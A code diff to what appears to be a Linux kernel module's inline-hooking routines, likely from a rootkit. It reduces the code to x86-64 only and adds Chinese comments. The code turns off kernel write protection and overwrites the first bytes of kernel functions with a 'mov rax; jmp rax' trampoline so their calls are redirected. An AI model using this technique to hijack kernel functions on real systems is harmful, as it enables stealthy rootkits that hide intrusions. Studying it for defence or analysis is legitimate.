@@ -12,8 +12,8 @@
 
 struct sym_hook {
     void *addr;
-    unsigned char o_code[HIJACK_SIZE];
-    unsigned char n_code[HIJACK_SIZE];
+    unsigned char o_code[HIJACK_SIZE];//原函数前HIJACK_SIZE个字节的备份
+    unsigned char n_code[HIJACK_SIZE];//hook函数的shellcode
     struct list_head list;
 };
 
@@ -52,52 +52,26 @@ void hijack_start ( void *target, void *new )
     struct sym_hook *sa;
     unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];
 
-    #if defined(_CONFIG_X86_)
-    unsigned long o_cr0;
-
-    // push $addr; ret
-    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
-    *(unsigned long *)&n_code[1] = (unsigned long)new;
-    #elif defined(_CONFIG_X86_64_)
     unsigned long o_cr0;
 
     // mov rax, $addr; jmp rax
     memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
     *(unsigned long *)&n_code[2] = (unsigned long)new;
-		#if __DEBUG_HOOK__
-		printk("n_code 0x%0x\n 0x%0x\n", (unsigned int)n_code, (unsigned int)new);
-		#endif
-    #else // ARM
-    if ( (unsigned long)target % 4 == 0 )
-    {
-        // ldr pc, [pc, #0]; .long addr; .long addr
-        memcpy(n_code, "\x00\xf0\x9f\xe5\x00\x00\x00\x00\x00\x00\x00\x00", HIJACK_SIZE);
-        *(unsigned long *)&n_code[4] = (unsigned long)new;
-        *(unsigned long *)&n_code[8] = (unsigned long)new;
-    }
-    else // Thumb
-    {
-        // add r0, pc, #4; ldr r0, [r0, #0]; mov pc, r0; mov pc, r0; .long addr
-        memcpy(n_code, "\x01\xa0\x00\x68\x87\x46\x87\x46\x00\x00\x00\x00", HIJACK_SIZE);
-        *(unsigned long *)&n_code[8] = (unsigned long)new;
-        target--;
-    }
-    #endif
+	#if __DEBUG_HOOK__
+	printk("x64 n_code: 0x%0x\tnew: 0x%0x\n", *n_code, (unsigned int)new);
+	#endif
 
     #if __DEBUG_HOOK__
     printk("Hooking function 0x%p with 0x%p\n", target, new);
     #endif
 
+	//备份原来函数前HIJACK_SIZE个字节
     memcpy(o_code, target, HIJACK_SIZE);
 
-    #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
     o_cr0 = disable_wp();
+	//将shellcode填充到调用函数前HIJACK_SIZE字节达到hook此函数的目的
     memcpy(target, n_code, HIJACK_SIZE);
     restore_wp(o_cr0);
-    #else // ARM
-    memcpy(target, n_code, HIJACK_SIZE);
-    cacheflush(target, HIJACK_SIZE);
-    #endif
 
     sa = kmalloc(sizeof(*sa), GFP_KERNEL);
     if ( ! sa )
@@ -108,6 +82,9 @@ void hijack_start ( void *target, void *new )
     memcpy(sa->n_code, n_code, HIJACK_SIZE);
 
     list_add(&sa->list, &hooked_syms);
+	#if __DEBUG_HOOK__
+    printk("sa: %p\tsa->list: 0x%p\t hooked_syms: %p\n", *sa, sa->list, &hooked_syms);
+    #endif
 }
 
 void hijack_pause ( void *target )
@@ -121,14 +98,10 @@ void hijack_pause ( void *target )
     list_for_each_entry ( sa, &hooked_syms, list )
         if ( target == sa->addr )
         {
-            #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
             unsigned long o_cr0 = disable_wp();
+			//恢复函数前HIJACK_SIZE个字节，卸载钩子
             memcpy(target, sa->o_code, HIJACK_SIZE);
             restore_wp(o_cr0);
-            #else // ARM
-            memcpy(target, sa->o_code, HIJACK_SIZE);
-            cacheflush(target, HIJACK_SIZE);
-            #endif
         }
 }
 
@@ -143,14 +116,10 @@ void hijack_resume ( void *target )
     list_for_each_entry ( sa, &hooked_syms, list )
         if ( target == sa->addr )
         {
-            #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
             unsigned long o_cr0 = disable_wp();
+			//填充shellcode，安装钩子
             memcpy(target, sa->n_code, HIJACK_SIZE);
             restore_wp(o_cr0);
-            #else // ARM
-            memcpy(target, sa->n_code, HIJACK_SIZE);
-            cacheflush(target, HIJACK_SIZE);
-            #endif
         }
 }
 
